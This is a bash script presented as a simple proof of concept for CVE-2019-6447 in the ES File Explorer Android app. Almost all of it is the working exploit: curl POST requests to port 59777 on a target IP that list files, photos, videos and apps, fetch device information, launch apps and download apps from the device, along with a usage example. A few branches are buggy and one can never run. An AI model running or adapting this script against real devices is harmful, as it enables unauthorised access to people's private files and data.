#!/bin/bash

if [ -z $1 ] || [ $1 = '-h' ] || [ $1 = '--help' ]
then
	printf "\n--- This is a very simple PoC of the ES File Explorer CVE-2019-6447 ---\n\n"
	printf "You can try the following commands: \n"
	printf "\nlistFiles	List all files\nlistPics	List all pictures\nlistVideos	List all videos\nlistAudios	List all audios\nlistApps	List all applications installed\nlistAppsSystem	List system apps\n"
	printf "listAppsPhone	List communication related applications\nlistAppsSdcard	List the apps installed on the sd card\nlistAppsAll	List all applications\ngetAppThumbnail	List icons for the specified application\nappLaunch	Start the developed application\nappPull		Download an application from your device\ngetDeviceInfo	Get system information\n\n"
	printf "Usage example: ./ESExplorerExploit.sh 10.10.10.247 sdcard listFiles\n"

elif [ $# = 3 ]
then
	curl --header '{"Content-Type":"application/json"}' --request POST --data {\"command\":\"$3\"} http://$1:59777/$2

elif [ $# = 2 ]
then
	curl --header '{"Content-Type":"application/json"}' --request POST --data {\"command\":\"$2\"} http://$1:59777/

elif [ $2 = *"getAppThumbnail"* ] || [ $2 = *"appLaunch"* ] || [ $2 = *"appPull"* ]
then
	curl --header '{"Content-Type":"application/json"}' --request POST --data '{"command":"$2 $3"}' http://$1:59777/
fi
